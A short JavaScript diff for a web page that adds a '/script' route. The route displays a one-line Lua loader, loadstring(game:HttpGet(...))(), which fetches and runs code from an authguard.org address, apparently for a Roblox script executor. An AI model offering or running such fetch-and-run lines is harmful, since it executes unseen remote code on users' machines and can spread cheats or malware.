@@ -1,4 +1,11 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // Check if this is the script page
+    if (window.location.pathname === '/script' || window.location.hash === '#script') {
+        // Return the Lua script content
+        document.body.innerHTML = 'loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/bc1760bd881f48be89a4551128ee9423"))()';
+        document.body.style.cssText = 'display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; background: #1a1a1a; color: #00ff00;';
+        return;
+    }
 
     particlesJS("particles-js", {
         "particles": {
